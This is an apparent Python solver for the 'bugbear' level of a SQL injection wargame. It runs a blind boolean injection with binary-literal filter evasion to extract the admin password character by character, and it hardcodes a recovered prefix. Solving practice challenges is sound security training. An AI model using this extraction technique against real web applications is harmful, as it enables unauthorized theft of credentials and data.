import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"

pw_len = None
prefix = ""

admin_minus_one = "admim"
admin_plus_one = "admio"
id_is_admin_query = f"id>{ascii_to_binary(admin_minus_one)}&&id<{ascii_to_binary(admin_plus_one)}"


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        pw_query = f"pw>{ascii_to_binary(prefix + chr(ord(c) - 1))}&&pw<{ascii_to_binary(prefix + chr(ord(c) + 1))}"
        res = make_request(chall_url, "?no=" + urllib.parse.quote(f"1||{id_is_admin_query}&&{pw_query}"))
        if hello_admin in res:
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 8
prefix = "52dc3991"

if pw_len is None:
    for i in range(40):
        res = make_request(chall_url, "?no=" + urllib.parse.quote(f"1||{id_is_admin_query}&&length(pw)<{i}"))
        if hello_admin in res:
            print("Found pw length:", i - 1)
            pw_len = i - 1
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
